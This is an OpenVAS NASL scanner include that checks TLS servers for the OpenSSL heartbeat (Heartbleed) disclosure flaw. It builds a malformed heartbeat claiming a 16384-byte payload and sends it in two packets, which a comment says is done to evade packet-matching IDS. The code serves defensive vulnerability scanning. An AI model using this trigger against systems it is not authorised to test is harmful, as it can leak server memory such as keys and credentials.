###############################################################################
# Functions OpenSSL TLS 'heartbeat' Extension Information Disclosure Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software
# Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301
# USA.
###############################################################################

function _broken_heartbeat( version )
{

  # TODO: Remove once openvas-nasl-lint can handle such a missing include
  # from within the same include.
  if(!defined_func("data_len")) include("ssl_funcs.inc");

  local_var version, hb, payload;

  if( ! version ) version = TLS_10;

  payload = raw_string( 0x01 ) + raw_string( 16384 / 256, 16384 % 256 ) + crap( length:16 ) + '------------------------->OpenVAS<-------------------------';
  hb = version + data_len( data:payload ) + payload;

  return hb;
}

function test_hb( port, version )
{
  local_var soc, hdr, len, pay, h, d, hello_done;

  soc = open_ssl_socket( port:port );
  if( ! soc ) return FALSE;

  hello = ssl_hello( version:version, extensions:make_list( "heartbeat"  ) );
  if( ! hello )
  {
    close( soc );
    return FALSE;
  }

  send( socket:soc, data:hello );

  while ( ! hello_done )
  {
    data = ssl_recv( socket:soc );
    if( ! data )
    {
      close( soc );
      return FALSE;
    }

    record = search_ssl_record( data:data, search: make_array( "handshake_typ", SSLv3_SERVER_HELLO ) );
    if( record )
    {
      if( record['extension_heartbeat_mode'] != 1  )
      {
        close( soc );
        return;
      }
    }

    record = search_ssl_record( data:data, search: make_array( "handshake_typ", SSLv3_SERVER_HELLO_DONE ) );
    if( record )
    {
      hello_done = TRUE;
      v = record["version"];
      break;
    }
  }

  if( ! hello_done )
  {
    close( soc );
    return FALSE;
  }

  # send heartbeat request in two packets to 
  # work around stupid IDS which try to detect
  # attack by matching packets only
  hb = _broken_heartbeat( version:version );

  send( socket:soc, data:raw_string( 0x18 ) );
  send( socket:soc, data:hb );

  d = ssl_recv( socket:soc );

  if( strlen( d ) > 3 && "->OpenVAS<-" >< d )
  {
    security_message( port:port );
    exit( 0 );
   }


  if( soc ) close( soc );
  return;

}
